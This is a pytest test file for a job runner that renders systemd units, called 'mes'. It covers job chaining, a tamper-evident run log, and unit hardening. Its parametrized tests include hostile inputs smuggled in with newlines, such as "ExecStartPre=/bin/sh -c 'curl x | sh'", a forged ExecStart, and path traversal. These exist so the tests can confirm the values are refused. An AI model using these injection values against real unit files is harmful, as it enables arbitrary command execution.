"""Tests for mes.jobs (mes jobs ...) and mes.units (systemd unit rendering)."""

from __future__ import annotations

import json
import re
import subprocess
import sys
from pathlib import Path

import pytest

from mes import cli, jobs, units
from mes.errors import MesError, Refused
from mes.manifest import Job, Manifest, loads

APP_TOML = """
[app]
name = "demo"
title = "Demo app"
version = "0.1.0"

[jobs.sync]
run = "ok sync --days 3"
schedule = "*-*-* 06:00:00"
network = ["api.example.com"]

[jobs.build]
run = "touch build"
after = "sync"
writes = ["data"]

[jobs.report]
run = "touch report"
after = "build"

[jobs.export]
run = "ok export"
manual = true

[jobs.broken]
run = "fail"
manual = true

[jobs.slow]
run = "sleep"
manual = true
timeout = "1s"

[jobs.flaky]
run = "temp"
manual = true

[jobs.after-broken]
run = "touch after-broken"
after = "broken"
"""

FAKE_APP = """\
#!{python}
import json, os, sys, time
cmd = [a for a in sys.argv[1:] if a != "--json"]
KINDS = {{"ok": "read", "fail": "write", "sleep": "read", "temp": "write", "touch": "write",
         "reset": "admin", "describe": "read", "crash": "write"}}
if cmd[0] == "describe":
    print(json.dumps({{"app": os.environ.get("FAKE_APP_NAME", "demo"),
                      "commands": [{{"name": n, "kind": k}} for n, k in KINDS.items()]}}))
elif cmd[0] == "crash":
    print(json.dumps({{"error": {{"code": "not_found", "message": "The notes-per-day table does not exist yet.",
                                 "hint": "Run the rebuild job first."}}}}))
    sys.exit(3)
elif cmd[0] == "ok":
    print(json.dumps({{"argv": cmd, "allow": os.environ.get("MES_ALLOW"),
                      "job": os.environ.get("MES_JOB"), "cwd": os.getcwd()}}))
elif cmd[0] == "fail":
    print("the source refused the request", file=sys.stderr)
    sys.exit(3)
elif cmd[0] == "sleep":
    time.sleep(30)
elif cmd[0] == "temp":
    sys.exit(75)
elif cmd[0] == "touch":
    d = os.path.join(os.environ["MES_DATA_HOME"], "demo")
    os.makedirs(d, exist_ok=True)
    with open(os.path.join(d, "order.txt"), "a") as f:
        f.write(cmd[1] + "\\n")
"""


def make_app(root: Path, *, toml: str = APP_TOML, installed: bool = True) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "app.toml").write_text(toml)
    (root / "pyproject.toml").write_text(
        '[project]\nname = "demo"\nversion = "0.1.0"\n\n[project.scripts]\ndemo = "demo.cli:main"\n'
    )
    if installed:
        bin_dir = root / ".venv" / "bin"
        bin_dir.mkdir(parents=True)
        exe = bin_dir / "demo"
        exe.write_text(FAKE_APP.format(python=sys.executable))
        exe.chmod(0o755)
    return root


@pytest.fixture
def app_root(tmp_path):
    return make_app(tmp_path / "apps" / "demo")


def mes(capsys, *argv):
    code = cli.run(["--json", *argv])
    out = capsys.readouterr().out
    return code, (json.loads(out) if out.strip() else None)


def order_file(mes_home) -> Path:
    return mes_home["data"] / "demo" / "order.txt"


def log_file(mes_home) -> Path:
    return mes_home["state"] / "demo" / "runs.jsonl"


# =========================================================================== list


def test_list_json(app_root, capsys):
    code, data = mes(capsys, "jobs", "list", "--app-dir", str(app_root))
    assert code == 0
    assert data["app"] == "demo"
    by = {j["name"]: j for j in data["jobs"]}
    assert by["sync"]["trigger"] == "schedule"
    assert by["sync"]["network"] == ["api.example.com"]
    assert by["build"]["when"] == 'after "sync" succeeds'
    assert by["export"]["network"] is False
    assert by["slow"]["timeout"] == "1s"


def test_list_text_from_current_folder(app_root, capsys, monkeypatch):
    monkeypatch.chdir(app_root)
    assert cli.run(["jobs", "list"]) == 0
    out = capsys.readouterr().out
    assert "sync" in out and "on schedule: *-*-* 06:00:00" in out
    assert "api.example.com" in out


def test_no_app_here(tmp_path, capsys, monkeypatch):
    (tmp_path / "empty").mkdir()
    (tmp_path / "empty" / "pyproject.toml").write_text("[project]\nname='x'\n")
    monkeypatch.chdir(tmp_path / "empty")
    code, data = mes(capsys, "jobs", "list")
    assert code == 3
    assert data["error"]["code"] == "not_found"


def test_group_without_action_is_usage_error(capsys):
    code, data = mes(capsys, "jobs")
    assert code == 2


# =========================================================================== run


def test_run_success_logs_and_sets_env(app_root, capsys, mes_home):
    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
    assert code == 0, data
    assert [r["job"] for r in data["runs"]] == ["export"]
    out = data["runs"][0]["data"]  # the app runs with --json, so its data comes back parsed
    assert out == json.loads(data["runs"][0]["output"])
    assert out["argv"] == ["ok", "export"]
    assert out["allow"] == "write"
    assert out["job"] == "export"
    assert Path(out["cwd"]).resolve() == app_root.resolve()

    records = jobs.read_log(log_file(mes_home))
    assert len(records) == 1
    rec = records[0]
    assert rec["job"] == "export" and rec["exit_code"] == 0 and rec["result"] == "success"
    assert rec["argv"] == [str(app_root / ".venv" / "bin" / "demo"), "--json", "ok", "export"]
    assert rec["prev"] == jobs.GENESIS
    assert set(rec) >= {"time", "job", "argv", "exit_code", "duration_s", "prev"}
    assert oct(log_file(mes_home).stat().st_mode & 0o777) == oct(0o600)


def test_run_text_mode(app_root, capsys):
    assert cli.run(["jobs", "run", "export", "--app-dir", str(app_root)]) == 0
    out = capsys.readouterr().out
    assert 'Job "export" finished successfully' in out


def test_run_follows_after_chain(app_root, capsys, mes_home):
    code, data = mes(capsys, "jobs", "run", "sync", "--app-dir", str(app_root))
    assert code == 0, data
    assert [r["job"] for r in data["runs"]] == ["sync", "build", "report"]
    assert order_file(mes_home).read_text().split() == ["build", "report"]
    assert [r["job"] for r in jobs.read_log(log_file(mes_home))] == ["sync", "build", "report"]


def test_run_no_chain(app_root, capsys, mes_home):
    code, data = mes(capsys, "jobs", "run", "sync", "--no-chain", "--app-dir", str(app_root))
    assert code == 0
    assert [r["job"] for r in data["runs"]] == ["sync"]
    assert not order_file(mes_home).exists()


def test_run_failure_stops_chain(app_root, capsys, mes_home):
    code, data = mes(capsys, "jobs", "run", "broken", "--app-dir", str(app_root))
    assert code == 1
    assert data["error"]["code"] == "job_failed"
    assert 'The job "broken" stopped with an error' in data["error"]["message"]
    assert "(after-broken) were not started" in data["error"]["message"]
    assert "the source refused the request" in data["error"]["detail"]
    assert "uv run demo fail" in data["error"]["hint"] and "'detail'" not in data["error"]["hint"]
    assert not order_file(mes_home).exists()  # after-broken did not run
    rec = jobs.read_log(log_file(mes_home))[-1]
    assert rec["result"] == "exit-code" and rec["exit_code"] == 3


def test_run_failure_text_goes_to_stderr(app_root, capsys):
    assert cli.run(["jobs", "run", "broken", "--app-dir", str(app_root)]) == 1
    cap = capsys.readouterr()
    assert cap.out == ""
    assert 'The job "broken" stopped with an error' in cap.err and "What to do:" in cap.err
    assert "What the app said:\nthe source refused the request" in cap.err


def test_run_timeout_is_stopped(app_root, capsys, mes_home):
    code, data = mes(capsys, "jobs", "run", "slow", "--app-dir", str(app_root))
    assert code == 1
    assert data["error"]["code"] == "job_timeout"
    rec = jobs.read_log(log_file(mes_home))[-1]
    assert rec["result"] == "timeout" and rec["exit_code"] is None
    assert rec["duration_s"] < 15


def test_run_temporary_failure_exit_75(app_root, capsys):
    code, data = mes(capsys, "jobs", "run", "flaky", "--app-dir", str(app_root))
    assert code == 75
    assert data["error"]["code"] == "job_temporary"


def test_run_unknown_job(app_root, capsys):
    code, data = mes(capsys, "jobs", "run", "nope", "--app-dir", str(app_root))
    assert code == 3
    assert "export" in data["error"]["hint"]


def test_run_needs_write_level(app_root, capsys, monkeypatch, mes_home):
    monkeypatch.setenv("MES_ALLOW", "read")
    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
    assert code == 4
    assert not log_file(mes_home).exists()
    code, _ = mes(capsys, "jobs", "list", "--app-dir", str(app_root))
    assert code == 0


def test_run_app_not_installed(tmp_path, capsys):
    root = make_app(tmp_path / "bare", installed=False)
    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(root))
    assert code == 3
    assert data["error"]["code"] == "app_not_installed"
    assert "uv sync" in data["error"]["hint"]


def test_run_twice_at_once_is_refused(app_root, capsys, mes_home):
    _, manifest = jobs.load_app(app_root)
    job = manifest.job("export")
    with jobs._job_lock(manifest, job):
        code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
    assert code == 75
    assert data["error"]["code"] == "job_running"


def test_run_never_uses_a_shell(tmp_path, capsys, mes_home):
    toml = '[app]\nname = "demo"\n[jobs.x]\nrun = "touch \'a b;c\'"\nmanual = true\n'
    root = make_app(tmp_path / "shell", toml=toml)
    code, _ = mes(capsys, "jobs", "run", "x", "--app-dir", str(root))
    assert code == 0
    assert order_file(mes_home).read_text() == "a b;c\n"


# =========================================================================== run log


def test_log_chain_and_verify(tmp_path):
    log = tmp_path / "s" / "runs.jsonl"
    a = jobs.append_record(log, {"time": "t1", "job": "a"})
    b = jobs.append_record(log, {"time": "t2", "job": "b"})
    jobs.append_record(log, {"time": "t3", "job": "c"})
    lines = log.read_bytes().splitlines()
    assert a["prev"] == jobs.GENESIS
    import hashlib

    assert b["prev"] == hashlib.sha256(lines[0]).hexdigest()
    assert json.loads(lines[2])["prev"] == hashlib.sha256(lines[1]).hexdigest()
    res = jobs.verify_log(log)
    assert res["ok"] and res["records"] == 3
    assert res["head"] == hashlib.sha256(lines[2]).hexdigest()


def test_verify_empty_log(tmp_path):
    res = jobs.verify_log(tmp_path / "missing.jsonl")
    assert res["ok"] and res["records"] == 0


def test_verify_detects_edit(tmp_path):
    log = tmp_path / "runs.jsonl"
    for i in range(3):
        jobs.append_record(log, {"time": f"t{i}", "job": "a", "exit_code": 1})
    lines = log.read_text().splitlines()
    lines[0] = lines[0].replace('"exit_code":1', '"exit_code":0')
    log.write_text("\n".join(lines) + "\n")
    with pytest.raises(MesError) as e:
        jobs.verify_log(log)
    assert e.value.code == "run_log_broken"
    assert "line 1 or an earlier line was changed" in e.value.message


def test_verify_detects_removed_line(tmp_path):
    log = tmp_path / "runs.jsonl"
    for i in range(3):
        jobs.append_record(log, {"time": f"t{i}", "job": "a"})
    lines = log.read_text().splitlines()
    log.write_text(lines[0] + "\n" + lines[2] + "\n")
    with pytest.raises(MesError) as e:
        jobs.verify_log(log)
    assert "a line right after it was removed" in e.value.message


def test_verify_detects_garbage_line(tmp_path):
    log = tmp_path / "runs.jsonl"
    jobs.append_record(log, {"time": "t", "job": "a"})
    with log.open("a") as f:
        f.write("not json")  # half-written line, no newline
    jobs.append_record(log, {"time": "t2", "job": "a"})
    with pytest.raises(MesError) as e:
        jobs.verify_log(log)
    assert "line 2" in e.value.message


def test_log_command(app_root, capsys, mes_home):
    mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
    mes(capsys, "jobs", "run", "sync", "--app-dir", str(app_root))
    code, data = mes(capsys, "jobs", "log", "--app-dir", str(app_root))
    assert code == 0
    assert [r["job"] for r in data["runs"]] == ["export", "sync", "build", "report"]
    code, data = mes(capsys, "jobs", "log", "--job", "build", "--limit", "5", "--app-dir", str(app_root))
    assert [r["job"] for r in data["runs"]] == ["build"]
    code, data = mes(capsys, "jobs", "log", "--verify", "--app-dir", str(app_root))
    assert code == 0 and data["ok"] and data["records"] == 4

    text = log_file(mes_home).read_text().replace('"job":"export"', '"job":"exporT"')
    log_file(mes_home).write_text(text)
    code, data = mes(capsys, "jobs", "log", "--verify", "--app-dir", str(app_root))
    assert code == 1 and data["error"]["code"] == "run_log_broken"


def test_status_shows_last_run(app_root, capsys, monkeypatch):
    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
    mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
    code, data = mes(capsys, "jobs", "status", "--app-dir", str(app_root))
    assert code == 0
    by = {r["job"]: r for r in data["jobs"]}
    assert by["export"]["last_result"] == "success" and by["export"]["last_exit_code"] == 0
    assert by["sync"]["last_run"] is None
    assert by["sync"]["installed"] is False and "Linux" in by["sync"]["installed_note"]


# =========================================================================== install / uninstall


def test_install_on_macos_explains(app_root, capsys, monkeypatch):
    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
    assert code == 1
    assert data["error"]["code"] == "needs_linux"
    assert "Linux server" in data["error"]["message"]


def test_install_needs_admin(app_root, capsys, monkeypatch):
    monkeypatch.setenv("MES_ALLOW", "write")
    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
    assert code == 4


def test_render_only_out(app_root, capsys, tmp_path):
    out = tmp_path / "units out"
    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(out), "--app-dir", str(app_root))
    assert code == 0, data
    names = sorted(p.name for p in out.iterdir())
    assert names == sorted([
        "mes.slice",
        "mes-demo-sync.service", "mes-demo-sync.timer",
        "mes-demo-build.service", "mes-demo-report.service",
        "mes-demo-export.service", "mes-demo-broken.service", "mes-demo-slow.service",
        "mes-demo-flaky.service", "mes-demo-after-broken.service",
    ])
    assert data["files"] == names
    assert [w for w in data["warnings"] if "simple check" not in w] == []
    assert any("api.example.com" in s for s in data["what_happens"])


def test_render_only_inline_and_out_needs_render_only(app_root, capsys, tmp_path):
    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(app_root))
    assert code == 0
    assert "mes-demo-sync.timer" in data["units"]
    code, data = mes(capsys, "jobs", "install", "--out", str(tmp_path / "x"), "--app-dir", str(app_root))
    assert code == 2


def test_render_only_warns_when_not_installed(tmp_path, capsys):
    root = make_app(tmp_path / "bare", installed=False)
    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(root))
    assert code == 0
    assert data["warnings"] and "uv sync" in data["warnings"][0]


class FakeSystemd:
    def __init__(self):
        self.calls: list[tuple[str, ...]] = []

    def __call__(self, *args):
        self.calls.append(args)
        return subprocess.CompletedProcess(["systemctl", "--user", *args], 0, "", "")


@pytest.fixture
def linux(monkeypatch):
    fake = FakeSystemd()
    monkeypatch.setattr(jobs, "_is_linux", lambda: True)
    monkeypatch.setattr(jobs, "_has_systemd", lambda: True)
    monkeypatch.setattr(jobs, "_systemctl", fake)
    monkeypatch.setattr(jobs, "_linger_warning", lambda: None)
    monkeypatch.setattr(jobs, "_check_schedules", lambda m: None)
    return fake


def test_install_and_uninstall_on_linux(app_root, capsys, linux, mes_home):
    unit_dir = mes_home["xdg_config"] / "systemd" / "user"
    # A unit of another app whose name starts the same way must be left alone.
    unit_dir.mkdir(parents=True)
    other = unit_dir / "mes-demo-x-sync.service"
    other.write_text(units.HEADER + "\n# mes-app: demo-x\n# mes-job: sync\n")

    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
    assert code == 0, data
    assert (unit_dir / "mes-demo-sync.timer").is_file()
    assert (unit_dir / "mes.slice").is_file()
    assert ("daemon-reload",) in linux.calls
    assert ("enable", "--now", "mes-demo-sync.timer") in linux.calls
    assert data["timers_started"] == ["mes-demo-sync.timer"]
    assert log_file(mes_home).is_file()  # must exist for ReadOnlyPaths
    assert (mes_home["data"] / "demo").is_dir()
    assert oct((unit_dir / "mes-demo-sync.service").stat().st_mode & 0o777) == oct(0o644)

    # Removing a job from app.toml removes its unit on the next install.
    (app_root / "app.toml").write_text(APP_TOML.replace("[jobs.flaky]\nrun = \"temp\"\nmanual = true\n", ""))
    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
    assert code == 0
    assert data["removed"] == ["mes-demo-flaky.service"]
    assert not (unit_dir / "mes-demo-flaky.service").exists()

    code, data = mes(capsys, "jobs", "status", "--app-dir", str(app_root))
    assert {r["job"]: r["installed"] for r in data["jobs"]}["sync"] is True

    code, data = mes(capsys, "jobs", "uninstall", "--app", "demo")
    assert code == 0
    assert "mes-demo-sync.timer" in data["removed"]
    assert ("disable", "--now", "mes-demo-sync.timer") in linux.calls
    assert not list(unit_dir.glob("mes-demo-s*"))
    assert other.is_file()
    assert log_file(mes_home).is_file()  # data and log kept


def test_install_refuses_foreign_unit(app_root, capsys, linux, mes_home):
    unit_dir = mes_home["xdg_config"] / "systemd" / "user"
    unit_dir.mkdir(parents=True)
    (unit_dir / "mes-demo-sync.service").write_text("[Service]\nExecStart=/bin/true\n")
    code, data = mes(capsys, "jobs", "install", "--app-dir", str(app_root))
    assert code == 5
    assert data["error"]["code"] == "unit_conflict"


def test_install_requires_installed_program(tmp_path, capsys, linux):
    root = make_app(tmp_path / "bare", installed=False)
    code, data = mes(capsys, "jobs", "install", "--app-dir", str(root))
    assert code == 3 and data["error"]["code"] == "app_not_installed"


def test_uninstall_on_macos_is_harmless(app_root, capsys, monkeypatch):
    monkeypatch.setattr(jobs, "_is_linux", lambda: False)
    code, data = mes(capsys, "jobs", "uninstall", "--app-dir", str(app_root))
    assert code == 0 and data["removed"] == []


INVOCATION = "0123456789abcdef0123456789abcdef"


def test_record_from_systemd(app_root, capsys, monkeypatch, mes_home):
    monkeypatch.setattr(jobs, "_is_linux", lambda: True)
    monkeypatch.setenv("INVOCATION_ID", INVOCATION)
    monkeypatch.setattr(jobs, "_show", lambda unit, *p: {
        "InvocationID": INVOCATION,
        "ExecMainStartTimestampMonotonic": "1000000", "ExecMainExitTimestampMonotonic": "3500000"})
    monkeypatch.setenv("SERVICE_RESULT", "exit-code")
    monkeypatch.setenv("EXIT_CODE", "exited")
    monkeypatch.setenv("EXIT_STATUS", "2")
    code, data = mes(capsys, "jobs", "record", "sync", "--app-dir", str(app_root))
    assert code == 0, data
    rec = jobs.read_log(log_file(mes_home))[-1]
    assert rec["via"] == "systemd" and rec["exit_code"] == 2 and rec["result"] == "exit-code"
    assert rec["duration_s"] == 2.5
    assert rec["argv"][1:] == ["ok", "sync", "--days", "3"]


# =========================================================================== unit rendering

DIRECTIVES = {
    "Unit": {"Description", "OnSuccess"},
    "Service": {
        "Type", "ExecStart", "ExecStopPost", "WorkingDirectory", "Environment", "Slice", "MemoryMax",
        "MemorySwapMax", "TimeoutStartSec", "RuntimeMaxSec", "UMask", "NoNewPrivileges", "PrivateUsers",
        "PrivateTmp", "ProtectSystem", "ProtectHome", "ReadWritePaths", "ReadOnlyPaths", "PrivateNetwork",
        "RestrictAddressFamilies", "RestrictSUIDSGID", "LockPersonality", "RestrictRealtime",
        "RestrictNamespaces", "ProtectKernelTunables", "ProtectKernelModules", "ProtectControlGroups",
        "SystemCallArchitectures", "SystemCallFilter",
    },
    "Timer": {"OnCalendar", "Persistent", "RandomizedDelaySec", "Unit"},
    "Install": {"WantedBy"},
    "Slice": set(),
}


def directives(text: str) -> list[tuple[str, str, str]]:
    """Parse a unit like systemd would (sections, Key=Value, continuation lines) and check it."""
    out = []
    section = None
    for raw in text.split("\n"):
        assert "\r" not in raw
        assert not raw.endswith("\\"), f"line continuation in {raw!r}"
        line = raw.strip()
        if not line or line[0] in "#;":
            continue
        if line.startswith("["):
            section = line.strip("[]")
            assert section in DIRECTIVES, section
            continue
        key, sep, value = line.partition("=")
        assert sep, f"not a directive: {raw!r}"
        assert key in DIRECTIVES[section], f"unexpected directive {key!r} in [{section}]"
        out.append((section, key, value))
    return out


def values(text: str, key: str) -> list[str]:
    return [v for _, k, v in directives(text) if k == key]


def split_exec(value: str) -> list[str]:
    """Undo quote_exec_word for a line of fully quoted words."""
    words = re.findall(r'"((?:[^"\\]|\\.)*)"', value)
    assert " ".join(f'"{w}"' for w in words) == value.lstrip("+")
    return [re.sub(r"\\(.)", r"\1", w).replace("%%", "%").replace("$$", "$") for w in words]


def render(manifest, *, root="/srv/apps/demo", data_home="/home/u/.local/share/mes",
           state_home="/home/u/.local/state/mes", exe="/srv/apps/demo/.venv/bin/demo"):
    return units.render_app(
        manifest, app_command=[exe], mes_command=["/usr/bin/python3", "-m", "mes.cli"],
        root=root, data_home=data_home, state_home=state_home,
    )


@pytest.fixture
def manifest():
    return loads(APP_TOML)


def test_service_directives(manifest):
    files = render(manifest)
    svc = files["mes-demo-export.service"]
    d = {k: v for _, k, v in directives(svc) if k not in ("Environment", "ReadWritePaths")}
    assert d["Type"] == "oneshot"
    assert split_exec(d["ExecStart"]) == ["/srv/apps/demo/.venv/bin/demo", "ok", "export"]
    assert d["ExecStopPost"].startswith("+")
    assert split_exec(d["ExecStopPost"]) == [
        "/usr/bin/python3", "-m", "mes.cli", "jobs", "record", "--app-dir", "/srv/apps/demo", "export"]
    assert d["MemoryMax"] == "256M"
    assert d["TimeoutStartSec"] == "900"
    assert d["RuntimeMaxSec"] == str(900 + units.TIMEOUT_GRACE_SEC)
    for key, val in [("NoNewPrivileges", "yes"), ("PrivateTmp", "yes"), ("ProtectSystem", "strict"),
                     ("ProtectHome", "read-only"), ("PrivateNetwork", "yes"), ("RestrictSUIDSGID", "yes"),
                     ("LockPersonality", "yes"), ("SystemCallFilter", "@system-service"),
                     ("UMask", "0077"), ("Slice", "mes.slice")]:
        assert d[key] == val, key
    assert values(svc, "ReadWritePaths") == ["/home/u/.local/share/mes/demo", "/home/u/.local/state/mes/demo"]
    assert d["ReadOnlyPaths"] == "/home/u/.local/state/mes/demo/runs.jsonl"
    assert '"MES_ALLOW=write"' in values(svc, "Environment")
    assert "[Install]" not in svc


def test_network_and_writes(manifest):
    files = render(manifest)
    sync = files["mes-demo-sync.service"]
    assert values(sync, "PrivateNetwork") == []
    assert values(sync, "RestrictAddressFamilies") == ["AF_UNIX AF_INET AF_INET6"]
    assert "# network: full internet access (meant for api.example.com; mes cannot limit it" in sync
    build = files["mes-demo-build.service"]
    assert values(build, "ReadWritePaths") == ["/home/u/.local/share/mes/demo"]


def test_timer_and_after(manifest):
    files = render(manifest)
    timer = files["mes-demo-sync.timer"]
    t = {k: v for _, k, v in directives(timer)}
    assert t["OnCalendar"] == "*-*-* 06:00:00"
    assert t["Persistent"] == "true"
    assert t["RandomizedDelaySec"] == str(units.RANDOM_DELAY_SEC)
    assert t["Unit"] == "mes-demo-sync.service"
    assert t["WantedBy"] == "timers.target"
    assert values(files["mes-demo-sync.service"], "OnSuccess") == ["mes-demo-build.service"]
    assert values(files["mes-demo-build.service"], "OnSuccess") == ["mes-demo-report.service"]
    assert values(files["mes-demo-report.service"], "OnSuccess") == []
    assert "mes-demo-export.timer" not in files and "mes-demo-build.timer" not in files
    assert units.read_markers(timer) == ("demo", "sync")
    directives(units.render_slice())


def test_escaping_of_paths_and_args(manifest):
    root = "/srv/my apps/50% \"done\" $HOME\\x"
    m = loads('[app]\nname = "demo"\n[jobs.x]\nrun = "ok \'%h $USER\' \\"q\\" back\\\\\\\\slash"\nmanual = true\n')
    # backslashes make WorkingDirectory unsafe, so use a root without one for the full render
    files = render(m, root=root.replace("\\x", "x"), exe=root.replace("\\x", "x") + "/.venv/bin/demo")
    svc = files["mes-demo-x.service"]
    d = {k: v for _, k, v in directives(svc) if k not in ("Environment", "ReadWritePaths")}
    argv = split_exec(d["ExecStart"])
    assert argv[0] == "/srv/my apps/50% \"done\" $HOME" + "x/.venv/bin/demo"
    assert argv[1:] == list(m.job("x").argv)
    assert "%h $USER" in argv
    assert "%%h $$USER" in d["ExecStart"]
    assert d["WorkingDirectory"] == '/srv/my apps/50%% "done" $HOME' + "x"
    assert split_exec(d["ExecStopPost"])[6] == root.replace("\\x", "x")
    # quote_exec_word handles backslashes too
    assert units.quote_exec_word('a\\"b') == '"a\\\\\\"b"'
    assert units.env_assignment("MES_JOB", 'x"%') == '"MES_JOB=x\\"%%"'


HOSTILE = "evil\nExecStartPre=/bin/sh -c 'curl x | sh'"


def _job(**kw):
    base = dict(name="x", run="ok", argv=("ok",), trigger="manual")
    base.update(kw)
    return Job(**base)


def _manifest(job, name="demo"):
    return Manifest(name=name, title="t", version="1", jobs={job.name: job})


@pytest.mark.parametrize("job", [
    _job(name=HOSTILE),
    _job(name="x\n[Service]"),
    _job(argv=("ok", HOSTILE)),
    _job(argv=("ok", "a\rb")),
    _job(argv=("ok", ";")),
    _job(argv=("ok", "x\x00y")),
    _job(trigger="schedule", schedule="daily\nExecStart=/bin/sh"),
    _job(trigger="schedule", schedule="daily %h"),
    _job(memory="256M\nMemoryMax=infinity"),
    _job(memory="infinity"),
    _job(timeout="15m\nTimeoutStartSec=0"),
    _job(network=("api.example.com\nPrivateNetwork=no",)),
    _job(network=("evil host",)),
    _job(writes=("data", "/etc")),
])
def test_hostile_manifest_values_are_refused(job):
    with pytest.raises(Refused) as e:
        render(_manifest(job))
    assert e.value.code == "unsafe_unit_value"
    assert e.value.exit_code == 5


@pytest.mark.parametrize("app_name", ["demo\nExecStart=/bin/sh", "Demo", "../etc", "a"])
def test_hostile_app_name_refused(app_name):
    with pytest.raises(Refused):
        render(_manifest(_job(), name=app_name))


@pytest.mark.parametrize("kw", [
    {"root": "/srv/app\nExecStart=/bin/sh"},
    {"root": "/srv/app\\"},
    {"root": "relative/app"},
    {"root": "/srv/../etc"},
    {"data_home": "/home/u/my data"},
    {"data_home": "/home/u/data\nReadWritePaths=/"},
    {"data_home": "/home/u/50%"},
    {"data_home": "relative"},
    {"state_home": "/home/u/st\"ate"},
    {"state_home": "/home/u/st\\ate"},
    {"exe": "demo"},
    {"exe": "-/bin/demo"},
    {"exe": "/srv/app/.venv/bin/demo\nExecStart=/bin/sh"},
])
def test_hostile_paths_refused(kw):
    with pytest.raises(Refused):
        render(_manifest(_job()), **kw)


def test_rendered_units_never_have_extra_directives(manifest):
    """Every rendered file parses into only the directives mes means to write."""
    for text in render(manifest, root="/srv/odd dir/%n $x").values():
        directives(text)


def test_hostile_job_name_in_manifest_is_rejected_earlier():
    with pytest.raises(MesError):
        loads('[app]\nname = "demo"\n[jobs."x\\nExecStart=/bin/sh"]\nrun = "ok"\nmanual = true\n')


# =========================================================================== review fixes


def test_render_only_out_never_follows_a_planted_symlink(app_root, capsys, tmp_path):
    out = tmp_path / "shared"
    out.mkdir(mode=0o700)
    victim = tmp_path / "victim.txt"
    victim.write_text("PRECIOUS")
    victim.chmod(0o600)
    (out / ".mes.slice.tmp").symlink_to(victim)
    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(out), "--app-dir", str(app_root))
    assert code == 0, data
    assert victim.read_text() == "PRECIOUS" and oct(victim.stat().st_mode & 0o777) == oct(0o600)
    assert (out / "mes.slice").is_file() and not (out / "mes.slice").is_symlink()
    assert oct((out / "mes.slice").stat().st_mode & 0o777) == oct(0o644)


def test_render_only_out_needs_admin(app_root, capsys, tmp_path, monkeypatch):
    monkeypatch.setenv("MES_ALLOW", "read")
    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(tmp_path / "o"), "--app-dir", str(app_root))
    assert code == 4 and not (tmp_path / "o").exists()
    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(app_root))
    assert code == 0 and "units" in data  # only showing them stays a read


def test_render_only_out_refuses_systemd_folder(app_root, capsys, mes_home):
    unit_dir = mes_home["xdg_config"] / "systemd" / "user"
    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(unit_dir), "--app-dir", str(app_root))
    assert code == 5 and data["error"]["code"] == "unsafe_folder"
    assert not list(unit_dir.glob("*")) if unit_dir.exists() else True


def test_render_only_out_refuses_foreign_and_shared(app_root, capsys, tmp_path):
    out = tmp_path / "o"
    out.mkdir(mode=0o700)
    (out / "mes-demo-sync.service").write_text("[Service]\nExecStart=/bin/true\n")
    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(out), "--app-dir", str(app_root))
    assert code == 5 and data["error"]["code"] == "unit_conflict"
    assert (out / "mes-demo-sync.service").read_text().startswith("[Service]")
    shared = tmp_path / "shared"
    shared.mkdir()
    shared.chmod(0o777)
    code, data = mes(capsys, "jobs", "install", "--render-only", "--out", str(shared), "--app-dir", str(app_root))
    assert code == 5 and data["error"]["code"] == "unsafe_folder" and not list(shared.iterdir())
    # Writing again over mes's own files is fine.
    good = tmp_path / "good"
    assert mes(capsys, "jobs", "install", "--render-only", "--out", str(good), "--app-dir", str(app_root))[0] == 0
    assert mes(capsys, "jobs", "install", "--render-only", "--out", str(good), "--app-dir", str(app_root))[0] == 0


def test_interpreter_script_is_never_the_app(tmp_path, capsys):
    root = make_app(tmp_path / "py")
    (root / "pyproject.toml").write_text('[project]\nname = "demo"\n[project.scripts]\npython = "demo.cli:main"\n')
    (root / ".venv" / "bin" / "python").symlink_to(sys.executable)
    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(root))
    assert code == 5 and data["error"]["code"] == "unsafe_app_program"


def test_job_run_must_be_an_app_command(tmp_path, capsys):
    toml = APP_TOML + '\n[jobs.bad]\nrun = "nosuchcmd --x"\nmanual = true\n\n[jobs.boss]\nrun = "reset"\nmanual = true\n'
    root = make_app(tmp_path / "x", toml=toml)
    code, data = mes(capsys, "jobs", "run", "bad", "--app-dir", str(root))
    assert code == 1 and data["error"]["code"] == "job_invalid"
    assert 'Job "bad" runs "nosuchcmd", but demo has no such command' in data["error"]["message"]
    code, data = mes(capsys, "jobs", "run", "boss", "--app-dir", str(root))
    assert code == 1 and "admin command" in data["error"]["message"]
    code, data = mes(capsys, "jobs", "list", "--app-dir", str(root))
    assert code == 0 and any("nosuchcmd" in w for w in data["warnings"])
    code, data = mes(capsys, "jobs", "install", "--render-only", "--app-dir", str(root))
    assert code == 0 and any("nosuchcmd" in w for w in data["warnings"])


def test_job_program_of_another_app_is_refused(app_root, capsys, monkeypatch):
    monkeypatch.setenv("FAKE_APP_NAME", "other")
    code, data = mes(capsys, "jobs", "run", "export", "--app-dir", str(app_root))
    assert code == 5 and data["error"]["code"] == "app_mismatch"


def test_failed_job_text_shows_what_the_app_said(tmp_path, capsys):
    toml = APP_TOML + '\n[jobs.stats]\nrun = "crash"\nmanual = true\n'
    root = make_app(tmp_path / "x", toml=toml)
    assert cli.run(["jobs", "run", "stats", "--no-chain", "--app-dir", str(root)]) == 1
    err = capsys.readouterr().err
    assert 'The job "stats" stopped with an error' in err
    assert "What the app said:\nThe notes-per-day table does not exist yet." in err
    assert "Its advice: Run the rebuild job first." in err
    assert "uv run demo crash" in err and "'detail'" not in err
